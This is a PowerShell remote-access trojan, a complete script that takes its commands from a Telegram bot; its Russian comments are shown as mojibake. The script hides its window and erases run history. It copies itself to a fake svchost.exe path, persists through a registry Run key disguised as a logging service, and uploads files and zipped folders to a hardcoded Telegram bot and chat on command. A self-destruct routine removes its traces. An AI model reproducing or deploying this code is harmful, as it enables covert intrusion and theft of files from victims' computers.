# RAT —á–µ—Ä–µ–∑ Telegram Bot - –ü–û–õ–ù–û–°–¢–¨–Æ –°–ö–†–´–¢–ê–Ø –í–ï–†–°–ò–Ø –î–õ–Ø WINDOWS 11
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–æ–¥–∏—Ä–æ–≤–∫–∏ UTF-8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

# –ü–æ–ª–Ω–æ–µ —Å–∫—Ä—ã—Ç–∏–µ –æ–∫–Ω–∞ PowerShell –¥–ª—è Windows 11
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

# –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –º–µ—Ç–æ–¥—ã —Å–∫—Ä—ã—Ç–∏—è
try {
    $processId = [System.Diagnostics.Process]::GetCurrentProcess().Id
    $process = Get-Process -Id $processId
    $process.PriorityClass = 'Idle'
} catch { }

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Å–∫—Ä—ã—Ç–Ω–æ—Å—Ç–∏
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ RUN –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
} catch { }

# –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π
function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
    }
    
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null
    } catch { }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        Send-TelegramFile -FilePath $FilePath
    }
}

# –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–∞–π–ª–æ–≤
function Send-TelegramFile {
    param([string]$FilePath)
    
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            $ChatID,
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            $fileEnc,
            "--$boundary--"
        ) -join "`r`n"

        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
    } catch { }
}

# –§—É–Ω–∫—Ü–∏—è —Å–æ–∑–¥–∞–Ω–∏—è ZIP –∞—Ä—Ö–∏–≤–∞
function Compress-Folder {
    param([string]$FolderPath, [string]$ZipPath)
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch {
        return $false
    }
}

# –§—É–Ω–∫—Ü–∏—è –æ—á–∏—Å—Ç–∫–∏ RAT
function Invoke-Cleanup {
    Send-Telegram "üîç –ù–∞—á–∏–Ω–∞–µ—Ç—Å—è –ø–æ–ª–Ω–∞—è –æ—á–∏—Å—Ç–∫–∞ RAT..."

    # 1. –ó–∞–≤–µ—Ä—à–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å—ã RAT
    Send-Telegram "üîÑ –≠—Ç–∞–ø 1: –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ RAT"
    Get-Process | Where-Object { $_.ProcessName -eq "powershell" } | ForEach-Object {
        try {
            $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($_.Id)").CommandLine
            if ($cmdLine -like "*8429674512*" -or $cmdLine -like "*System32Logs*") {
                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
            }
        } catch { }
    }

    # 2. –£–¥–∞–ª—è–µ–º —Ñ–∞–π–ª—ã RAT
    Send-Telegram "üîÑ –≠—Ç–∞–ø 2: –£–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ RAT"
    $filesToDelete = @(
        "$env:APPDATA\Microsoft\Windows\System32Logs\svchost.exe",
        "$env:TEMP\windows_update.marker"
    )

    $deletedFiles = @()
    foreach ($file in $filesToDelete) {
        if (Test-Path $file) {
            try {
                Remove-Item $file -Force -ErrorAction SilentlyContinue
                $deletedFiles += $file
            } catch { }
        }
    }

    # 3. –û—á–∏—â–∞–µ–º –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É —Ä–µ–µ—Å—Ç—Ä–∞
    Send-Telegram "üîÑ –≠—Ç–∞–ø 3: –û—á–∏—Å—Ç–∫–∞ —Ä–µ–µ—Å—Ç—Ä–∞"
    $regPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
    )

    $regEntries = @()
    foreach ($regPath in $regPaths) {
        try {
            Remove-ItemProperty -Path $regPath -Name "System32 Logs Service" -Force -ErrorAction SilentlyContinue
            $regEntries += "$regPath\System32 Logs Service"
        } catch { }
    }

    # 4. –û—á–∏—â–∞–µ–º –∏—Å—Ç–æ—Ä–∏—é RUN
    Send-Telegram "üîÑ –≠—Ç–∞–ø 4: –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ RUN"
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue

    # 5. –§–∏–Ω–∞–ª—å–Ω—ã–π –æ—Ç—á–µ—Ç
    $report = "‚úÖ –û–ß–ò–°–¢–ö–ê RAT –ó–ê–í–ï–†–®–ï–ù–ê"
    if ($deletedFiles.Count -gt 0) {
        $report += "`n–£–¥–∞–ª–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã:`n$($deletedFiles -join "`n")"
    }
    if ($regEntries.Count -gt 0) {
        $report += "`n–£–¥–∞–ª–µ–Ω–Ω—ã–µ –∑–∞–ø–∏—Å–∏ —Ä–µ–µ—Å—Ç—Ä–∞:`n$($regEntries -join "`n")"
    }
    
    Send-Telegram $report
    return $true
}

# –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø—Ä–∏ –ø–µ—Ä–≤–æ–º –∑–∞–ø—É—Å–∫–µ
$installMarker = "$env:TEMP\windows_update.marker"
$hiddenFolder = "$env:APPDATA\Microsoft\Windows\System32Logs"
$scriptPath = "$hiddenFolder\svchost.exe"

if (!(Test-Path $installMarker)) {
    # –°–æ–∑–¥–∞–µ–º –º–∞—Ä–∫–µ—Ä —É—Å—Ç–∞–Ω–æ–≤–∫–∏
    "Installed $(Get-Date)" | Out-File -FilePath $installMarker -Encoding UTF8 -ErrorAction SilentlyContinue
    
    # –°–æ–∑–¥–∞–µ–º —Å–∫—Ä—ã—Ç—É—é –ø–∞–ø–∫—É
    if (!(Test-Path $hiddenFolder)) { 
        New-Item -Path $hiddenFolder -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    }
    
    # –ö–æ–ø–∏—Ä—É–µ–º —Ç–µ–∫—É—â–∏–π —Å–∫—Ä–∏–ø—Ç
    try {
        $currentScript = Get-Content -LiteralPath $MyInvocation.MyCommand.Path -Raw -ErrorAction SilentlyContinue
        if ($currentScript) {
            $currentScript | Out-File -FilePath $scriptPath -Encoding UTF8 -ErrorAction SilentlyContinue
        }
    } catch {
        # –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥ –ø–æ–ª—É—á–µ–Ω–∏—è —Å–∫—Ä–∏–ø—Ç–∞
        try {
            $currentScript = Get-Content -Path $PSCommandPath -Raw -ErrorAction SilentlyContinue
            $currentScript | Out-File -FilePath $scriptPath -Encoding UTF8 -ErrorAction SilentlyContinue
        } catch { }
    }
    
    # –î–æ–±–∞–≤–ª—è–µ–º –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    if (!(Test-Path $regPath)) { 
        New-Item -Path $regPath -Force -ErrorAction SilentlyContinue | Out-Null 
    }
    
    Set-ItemProperty -Path $regPath -Name "System32 Logs Service" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º —Å–∫—Ä—ã—Ç—É—é –∫–æ–ø–∏—é
    if (Test-Path $scriptPath) {
        Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`""
        exit
    }
}

# –û—Å–Ω–æ–≤–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
$currentDir = "C:\"
$global:LastSentMessage = ""
$global:LastUpdateId = 0

# –û—Ç–ø—Ä–∞–≤–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∑–∞–ø—É—Å–∫–µ
Send-Telegram "RAT –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω –Ω–∞ $env:COMPUTERNAME
–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:
/help - —Å–ø–∏—Å–æ–∫ –∫–æ–º–∞–Ω–¥
/ls - —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤
/cd [–ø–∞–ø–∫–∞] - —Å–º–µ–Ω–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
/download [—Ñ–∞–π–ª] - —Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª
/destroy - —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ"

# –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª –æ–ø—Ä–æ—Å–∞
while ($true) {
    try {
        $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
        
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $global:LastUpdateId = $update.update_id
                
                if ($update.message.chat.id -eq $ChatID) {
                    $command = $update.message.text
                    
                    switch -regex ($command) {
                        "^/help$" {
                            Send-Telegram "–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:
/help - –ø–æ–∫–∞–∑–∞—Ç—å —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ
/ls - —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ –≤ —Ç–µ–∫—É—â–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
/cd [–ø–∞–ø–∫–∞] - —Å–º–µ–Ω–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
/download [—Ñ–∞–π–ª] - —Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª –∏–ª–∏ –ø–∞–ø–∫—É
/destroy - —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ RAT"
                        }
                        "^/ls$" {
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "üìÅ" } else { "üìÑ" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "–°–æ–¥–µ—Ä–∂–∏–º–æ–µ $currentDir
$($fileList -join "`n")"
                        }
                        "^/cd (.+)$" {
                            $newDir = $matches[1].Trim()
                            if ($newDir -eq "..") {
                                $currentDir = Split-Path $currentDir -Parent
                                if (!$currentDir) { $currentDir = "C:\" }
                            } else {
                                $testPath = Join-Path $currentDir $newDir
                                if (Test-Path $testPath -PathType Container) {
                                    $currentDir = $testPath
                                } else {
                                    Send-Telegram "–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞: $newDir"
                                    continue
                                }
                            }
                            
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "üìÅ" } else { "üìÑ" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "/ls $currentDir
$($fileList -join "`n")"
                        }
                        "^/download (.+)$" {
                            $target = $matches[1].Trim()
                            $fullPath = Join-Path $currentDir $target
                            
                            if (Test-Path $fullPath) {
                                if (Test-Path $fullPath -PathType Container) {
                                    $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                    if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                        Send-Telegram "–ü–∞–ø–∫–∞ $target –∑–∞–∞—Ä—Ö–∏–≤–∏—Ä–æ–≤–∞–Ω–∞" $zipPath
                                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                    } else {
                                        Send-Telegram "–û—à–∏–±–∫–∞ –∞—Ä—Ö–∏–≤–∞—Ü–∏–∏ –ø–∞–ø–∫–∏: $target"
                                    }
                                } else {
                                    Send-Telegram "–§–∞–π–ª $target –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω" $fullPath
                                }
                            } else {
                                Send-Telegram "–§–∞–π–ª/–ø–∞–ø–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã: $target"
                            }
                        }
                        "^/destroy$" {
                            Send-Telegram "üîÑ –ó–∞–ø—É—Å–∫ –ø—Ä–æ—Ü–µ–¥—É—Ä—ã —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è..."
                            $cleanupResult = Invoke-Cleanup
                            if ($cleanupResult) {
                                Start-Sleep -Seconds 2
                                Stop-Process -Id $pid -Force
                            }
                        }
                    }
                }
            }
        }
    } catch { }
    Start-Sleep -Seconds 2
}
